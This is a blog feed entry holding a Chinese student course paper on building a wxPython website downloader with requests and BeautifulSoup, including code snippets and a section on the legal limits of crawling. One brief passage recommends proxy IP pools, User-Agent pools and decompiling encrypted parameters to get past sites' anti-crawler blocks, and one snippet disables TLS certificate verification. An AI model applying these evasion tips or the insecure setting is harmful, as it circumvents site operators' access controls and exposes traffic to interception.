    
    <category term="Python" scheme="https://shierjinghuang.github.io/tags/Python/"/>
    
    <category term="tkinter" scheme="https://shierjinghuang.github.io/tags/tkinter/"/>
    
  </entry>
  
  <entry>
    <title>课程论文-源代码下载器的设计实现</title>
    <link href="https://shierjinghuang.github.io/2022/07/05/%E8%AF%BE%E7%A8%8B%E8%AE%BA%E6%96%87-%E6%BA%90%E4%BB%A3%E7%A0%81%E4%B8%8B%E8%BD%BD%E5%99%A8%E7%9A%84%E8%AE%BE%E8%AE%A1%E5%AE%9E%E7%8E%B0/"/>
    <id>https://shierjinghuang.github.io/2022/07/05/%E8%AF%BE%E7%A8%8B%E8%AE%BA%E6%96%87-%E6%BA%90%E4%BB%A3%E7%A0%81%E4%B8%8B%E8%BD%BD%E5%99%A8%E7%9A%84%E8%AE%BE%E8%AE%A1%E5%AE%9E%E7%8E%B0/</id>
    <published>2022-07-05T04:55:20.000Z</published>
    <updated>2025-03-27T08:21:11.547Z</updated>
    
    <content type="html"><![CDATA[<h1><center>网站源代码下载器的设计与实现</center></h1>> **摘要：**随着时代的进步以及科技的发展，人们越来越多的需要高效地从互联网上获取所需的信息，然而其对网络的要求和一些站点人为的限制，却也制约了用户对网络信息的获取和保存。对此，针对于一项可以实现将网站数据便捷获取并长期保存的网站源代码下载器进行了学习研究设计开发，主要应用了爬虫技术通过伪装成客户端与服务器进行数据交互，实现数据采集。可视化网站源代码下载器将实现对用户输入站点的下载实现长期保存，便于用户访问。<p><strong>关键词：</strong> <code>计算机网络</code>   <code>网络爬虫</code>   <code>WxPython正则表达式</code>   <code>requests</code></p><h3 id="1-HTTP协议"><a href="#1-HTTP协议" class="headerlink" title="1.HTTP协议"></a>1.HTTP协议</h3><p>HTTP 报文是在应用程序之间发送的数据块,这些数据块将通过以文本形式的元信息开头，用于 HTTP 协议交互。请求端(客户端)的 HTTP 报文叫做请求报文，响应端(服务器端)的叫做响应报文。 HTTP 报文本身是由多行(用 CR+LF 作换行符)数据构成的字符串文本。（图1.1 Http报文格式）</p><img src="D:\blog\shierjinghuang\source\_posts\课程论文-源代码下载器的设计实现\Http报文格式.png" style="zoom:150%;" /><center>图1.1 Http报文格式</center>### 2.网络爬虫<p>网络爬虫就是自动从互联网中定向或者不定项的采集信息的一种程序。网络爬虫通过伪装成客户端与服务器进行数据交互的，从而实现数据采集，搜索引擎，模拟操作等功能（图2.1 网络爬虫知识图谱）。网络爬虫大致可分为三大模块即，发送请求获取数据，解析数据与获取数据。</p><p>爬虫的第一个步骤是获取数据，就是对起始 URL 发送请求，以获取其返回的响应，值得注意的是，发送请求实质上是指发送请求报文的过程。其报文头部的内容广泛使用于反爬虫策略与抗反爬虫策略。</p><p>数据下载是数据爬取过程中的重要环节。执行数据下载之前首先需要对数据爬取对象网站进行全面地了解，包括此网站数据展示介质、网站背景、网站的组织结构及今后的发展等，在对爬取对象可能出现的展示形式（Web、PC 端应用、APP）进行分析后，才能确定要爬取的具体展现形式[5]</p><p>一个完整的爬虫应用不光涉及网络技术，在获取并下载数据后，还需要对数据进行分析，提取需要的信息，并对数据进行可视化分析和展示。</p><img src="D:\blog\shierjinghuang\source\_posts\课程论文-源代码下载器的设计实现\网络爬虫知识图谱.png"  /><center>图2.1 网络爬虫知识图谱</center>#### 2.1 requests<p>requests库是基于<code>urllib</code>库，采用<code>Apache2 Licensed </code>开源协议编写的，基于其内置的urllib3，其允许程序发送HTTP/1.1请求，且不需要手动的为URL添加查询字串，也不需要对<strong>POST</strong>数据进行表单编码，可以轻易的向对应的网站发起请求，从而对网页数据进行获取，还可以获取服务器返回的响应内容和状态码。</p><h4 id="2-2-正则表达式"><a href="#2-2-正则表达式" class="headerlink" title="2.2 正则表达式"></a>2.2 正则表达式</h4><p>正则表达式是使用单个字符串来描述、匹配一系列符合某个句法规则的字符串，是一种匹配字符串的方法，通过一些特殊符号，实现快速查找、删除、替换某个特定字符串。正则表达式一般用于脚本编程与文本编辑器中，在本程序中通过python re库正则表达式匹配方法，实现对正确输入文本的匹配及对部分内容的批量替换。</p><h4 id="2-3-WxPython"><a href="#2-3-WxPython" class="headerlink" title="2.3 WxPython"></a>2.3 WxPython</h4><p>WxPython是一个开发桌面端图形界面的跨平台函数库，开发语言为Python，它是基于C++的函数库wxWidgets的封装的跨平台GUI工具。</p><h4 id="2-4-Beautiful-Soup"><a href="#2-4-Beautiful-Soup" class="headerlink" title="2.4 Beautiful Soup"></a>2.4 Beautiful Soup</h4><p>Beautiful Soup就是Python的一个HTML或XML的解析库，提供一些简单的、Python式的函数来处理导航、搜索、修改分析树等功能，主要用于将HTML标签转换为Python对象树，并通过解析文档为用户提供需要抓取的数据。</p><h4 id="2-5-抗反爬虫策略"><a href="#2-5-抗反爬虫策略" class="headerlink" title="2.5 抗反爬虫策略"></a>2.5 抗反爬虫策略</h4><p>随着反爬虫程序被研发利用来，越多的网站都有自己的反爬机制，抓取数据已经不像以前那么容易。</p><p>目前，大部分网站都希望正常的用户进行访问，不希望爬虫轻易抓取他们的网站。究其原因，爬虫一方面会给他们的网站带来无用的性能压力，另一方面爬虫会造成他们网站的数据被“盗取”，于是，这些网站开始制定相应的反爬虫策略。一般的反爬策略例如：设置单个IP在单位时间内不能请求次数超过阈值或者请求的频率高于他们认为的人为行为频率、请求参数中带有他们加密后的字段值等。</p><p>要解决网站反爬的问题，首先要知道自己被封的原因和对方的“封堵机制”，这样才能更有效地使用上面的措施解决问题。针对单个IP单位时间内不能请求超过阈值情况，我们需要更改自己的抗反爬策略，一般情况下可以使用User-Agent池、降低下载频率、使用代理IP池等方式解决 ；针对数据加密的情况，可以通过反编译进行解决。</p><h4 id="2-6-关于网络爬虫的法律问题"><a href="#2-6-关于网络爬虫的法律问题" class="headerlink" title="2.6 关于网络爬虫的法律问题"></a>2.6 关于网络爬虫的法律问题</h4><p>遵守Robots协议，此协议声明那些内容不应被搜索引擎的漫游器获取的，哪些是可以被漫游器获取的。 </p><p>不能造成对方服务器瘫痪，2021年颁布实施的《数据安全管理办法》规定网络运营者采取自动化手段访问收集网站数据，不得妨碍网站正常运行[5]</p><p>不能非法获利，不能涉及个人隐私采集的信息，属于公民个人信息的，有可能构成非法获取公民个人信息的违法行为，情节严重的，有可能构成“侵犯公民个人信息罪”因此爬虫开发者的道德和良知才是避免触碰法律底线的根本所在。</p><h3 id="3-设计方法及思路"><a href="#3-设计方法及思路" class="headerlink" title="3. 设计方法及思路"></a><strong>3.</strong> 设计方法及思路</h3><h4 id="3-1-问题分析"><a href="#3-1-问题分析" class="headerlink" title="3.1 问题分析"></a>3.1 问题分析</h4><p>网站源代码下载器这一程序设计的关键在于如何使用户更加便利的保存网络站点上的信息，实现在无互联网的情况下的长期保存。程序将在完成，发送请求获取数据，解析数据与获取数据这三大基本功能的前提下，实现将网页原始数据的加工处理。</p><img src="D:\blog\shierjinghuang\source\_posts\课程论文-源代码下载器的设计实现\流程图.png"  /><h4 id="3-2-设计思路"><a href="#3-2-设计思路" class="headerlink" title="3.2 设计思路"></a>3.2 设计思路</h4><p>基于网络爬虫下实现网站源代码下载器的设计开发，在针对大量网站进行研究后，总结部分结论，不同类型站点网页设计人员对项目设计的方式差异性明显，部分站点可能因为开发时间和后期的修改，呈现出十分混乱的特点，这些都增加了网站源代码下载器的设计难度。针对以上特点，对网站源代码下载器的功能进行设计，利用正则匹配等方式尽可能保留站点原始样貌。</p><p>对于程序设计采用python语言，建立两大模块，即可视化客户端与网络爬虫程序，本项目的网络爬虫程序接近于聚焦网络爬虫，聚焦到特定主题目标网站进行爬取，包含页面爬取模块、无关链接过滤等功能。再对爬取到的信息进行提取和分析，最终能够运行实现网站源码下载器的开发。</p><h3 id="4-具体代码设计及运行"><a href="#4-具体代码设计及运行" class="headerlink" title="4. 具体代码设计及运行"></a>4. 具体代码设计及运行</h3><p>设置一个class类Frame，使用WxPython库的方法实现可视化程序的实现并提供后台接口（如图3.1 网络源代码下载器），通过输入事件监听与正则表达式对用户输入数据进行分析。在输入内容符合要求时通过后台网络爬虫，之后进行数据采集。实现网站源代码下载器的应用。（如图3.2 网站源码下载反馈）</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">an1_anbdj</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> event<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>self<span class="token punctuation">.</span>url <span class="token operator">==</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        toastone <span class="token operator">=</span> wx<span class="token punctuation">.</span>MessageDialog<span class="token punctuation">(</span><span class="token boolean">None</span><span class="token punctuation">,</span> <span class="token string">"网站地址不能为空!"</span><span class="token punctuation">,</span> <span class="token string">"错误信息提示"</span><span class="token punctuation">,</span> wx<span class="token punctuation">.</span>YES_DEFAULT <span class="token operator">|</span> wx<span class="token punctuation">.</span>ICON_QUESTION<span class="token punctuation">)</span>        <span class="token keyword">if</span> toastone<span class="token punctuation">.</span>ShowModal<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> wx<span class="token punctuation">.</span>ID_YES<span class="token punctuation">:</span>            <span class="token comment"># 如果点击了提示框的确定按钮</span>            toastone<span class="token punctuation">.</span>Destroy<span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token comment"># 则关闭提示框</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        match<span class="token operator">=</span>re<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">'(https?|ftp|file)://[-A-Za-z0-9+&amp;@#/%?=~_|!:,.;]+[-A-Za-z0-9+&amp;@#/%=~_|]'</span><span class="token punctuation">,</span> self<span class="token punctuation">.</span>url<span class="token punctuation">)</span>        <span class="token keyword">if</span> match<span class="token punctuation">:</span>            download_img<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><img src="D:\blog\shierjinghuang\source\_posts\课程论文-源代码下载器的设计实现\网络源代码下载器.png"  /><center>图4.1 网络源代码下载器</center>后台程序接收到可执行的信息后，对信息做出后续处理。对网页内各种资源标签进行匹配，将网页数据（如图片，CSS文件，JS文件）保存至本地，并将其转为相对路径，便于用户直接使用。（如图4.2 本地存储文件、图4.3 本地网页展示）<img src="D:\blog\shierjinghuang\source\_posts\课程论文-源代码下载器的设计实现\本地存储文件.png"  /><center>图4.2 本地存储文件</center><img src="D:\blog\shierjinghuang\source\_posts\课程论文-源代码下载器的设计实现\本地网页展示.png" style="zoom: 150%;" /><center>图4.3 本地网页展示</center>在程序的后台处理中依次实现了，发送请求获取数据，解析数据与获取数据请求获取数据，并对其进行解析：<pre class="line-numbers language-python" data-language="python"><code class="language-python">host <span class="token operator">=</span> re<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">u'[a-zA-Z0-9][-a-zA-Z0-9]&#123;0,62&#125;(\.[a-zA-Z0-9][-a-zA-Z0-9]&#123;0,62&#125;)+\.?'</span><span class="token punctuation">,</span> self<span class="token punctuation">.</span>url<span class="token punctuation">)</span>Host <span class="token operator">=</span> <span class="token string">'https://'</span><span class="token operator">+</span> host<span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>a <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>self<span class="token punctuation">.</span>url<span class="token punctuation">,</span> verify<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>a<span class="token punctuation">.</span>encoding <span class="token operator">=</span> <span class="token string">"utf-8"</span>bsobj <span class="token operator">=</span> BeautifulSoup<span class="token punctuation">(</span>a<span class="token punctuation">.</span>content<span class="token punctuation">,</span> <span class="token string">'lxml'</span><span class="token punctuation">)</span> <span class="token comment"># 将网页源码构造成BeautifulSoup对象，方便操作</span>a_list <span class="token operator">=</span> bsobj<span class="token punctuation">.</span>find_all<span class="token punctuation">(</span><span class="token string">'a'</span><span class="token punctuation">)</span>  <span class="token comment"># 获取网页中的所有a标签对象</span>script_list <span class="token operator">=</span> bsobj<span class="token punctuation">.</span>find_all<span class="token punctuation">(</span><span class="token string">'script'</span><span class="token punctuation">)</span><span class="token comment"># 获取网页中所有的script标签</span>link_list <span class="token operator">=</span> bsobj<span class="token punctuation">.</span>find_all<span class="token punctuation">(</span><span class="token string">'link'</span><span class="token punctuation">)</span><span class="token comment"># 获取网页中所有的link标签</span>img_list <span class="token operator">=</span> bsobj<span class="token punctuation">.</span>find_all<span class="token punctuation">(</span><span class="token string">'img'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>对获取到的数据在运行空间暂存，程序对其进行分析，生成标准URL，再次转入数据获取函数，在数据获取完成后，对文件进行格式化保存，将通过数据解析的数据，以其在服务器的相对位置进行存储。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">save_file</span><span class="token punctuation">(</span>chdir_path<span class="token punctuation">,</span> filename<span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> filename<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token punctuation">]</span> <span class="token keyword">in</span> <span class="token punctuation">[</span><span class="token string">'.jpg'</span><span class="token punctuation">,</span> <span class="token string">'.png'</span><span class="token punctuation">,</span> <span class="token string">'webp'</span><span class="token punctuation">,</span><span class="token string">'.png'</span><span class="token punctuation">,</span><span class="token string">'jpeg'</span><span class="token punctuation">,</span> <span class="token string">'.gif'</span><span class="token punctuation">,</span> <span class="token string">'.bmp'</span><span class="token punctuation">]</span><span class="token punctuation">:</span>        <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>chdir_path <span class="token operator">+</span> <span class="token string">'/'</span> <span class="token operator">+</span> <span class="token string">'images/'</span> <span class="token operator">+</span> filename <span class="token punctuation">,</span> <span class="token string">"wb+"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>            f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>content<span class="token punctuation">)</span>    <span class="token keyword">elif</span> filename<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'js'</span><span class="token punctuation">:</span>        <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>chdir_path <span class="token operator">+</span> <span class="token string">'/'</span> <span class="token operator">+</span> <span class="token string">'js/'</span> <span class="token operator">+</span> filename<span class="token punctuation">,</span> <span class="token string">'w+'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>            f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>content<span class="token punctuation">)</span>    <span class="token keyword">elif</span> filename<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'css'</span><span class="token punctuation">:</span>        <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>chdir_path <span class="token operator">+</span> <span class="token string">'/'</span> <span class="token operator">+</span> <span class="token string">'css/'</span> <span class="token operator">+</span> filename<span class="token punctuation">,</span> <span class="token string">'w+'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>            f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>content<span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>chdir_path <span class="token operator">+</span> <span class="token string">'/'</span> <span class="token operator">+</span> filename<span class="token punctuation">,</span> <span class="token string">'w+'</span><span class="token punctuation">,</span>encoding<span class="token operator">=</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>            f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>content<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>为便于用户后期的直接长期阅读，程序后台还通过re模块通过正则匹配将原程序Html文件及CSS中超链接路径匹配为相应的相对路径。</p><h3 id="5．总结"><a href="#5．总结" class="headerlink" title="5．总结"></a>5．总结</h3><p>本文使用Python程序设计软件设计开发了简单的源代码下载器，利用WxPython的有关知识，建立了可视化端口，为爬虫程序提供可用接口，基于网络爬虫的原理下，成功的设计出了程序，实现了网站源码下载器的开发。并且在正则表达式的支持下，将网页原始路径转化为相对路径，不会出现因防盗链和文件路径的不准确或者丢失的情况出现。实现了在没有互联网的情况之下数据的长期保存。</p><h3 id="参考文献："><a href="#参考文献：" class="headerlink" title="参考文献："></a>参考文献：</h3><p>[1] 朱荣.《python与大数据分析应用》.清华大学出版社.2021.3.P101-P107</p><p>[2] 谢希仁.《计算机网络》.电子工业出版社.2013.6.P35-P37、P115-P124、P238-P241</p><p>[3] 吴海燕,佟秋利《我国网络安全法律法规体系框架》.中国教育网络.2021.08 P66-P67</p><p>[4] 2021 Bad Bot Report [EB/OL]. <a href="https://www.imperva.com/resources/reports/Bad-Bot-Report">https://www.imperva.com/resources/reports/Bad-Bot-Report</a> 2021</p><p>[5] 孟宝灿,《Python网络爬虫应用探讨》广播电视信息 2022.03 P108-P110</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1&gt;&lt;center&gt;网站源代码下载器的设计与实现&lt;/center&gt;&lt;/h1&gt;
&gt; **摘要：**随着时代的进步以及科技的发展，人们越来越多的需要高效地从互联网上获取所需的信息，然而其对网络的要求和一些站点人为的限制，却也制约了用户对网络信息的获取和保存。对此，针对于一项可以实</summary>
      
    
    
    
    <category term="项目设计" scheme="https://shierjinghuang.github.io/categories/%E9%A1%B9%E7%9B%AE%E8%AE%BE%E8%AE%A1/"/>
    
    
    <category term="课程论文" scheme="https://shierjinghuang.github.io/tags/%E8%AF%BE%E7%A8%8B%E8%AE%BA%E6%96%87/"/>
    
    <category term="Python爬虫" scheme="https://shierjinghuang.github.io/tags/Python%E7%88%AC%E8%99%AB/"/>
    
  </entry>
  
</feed>
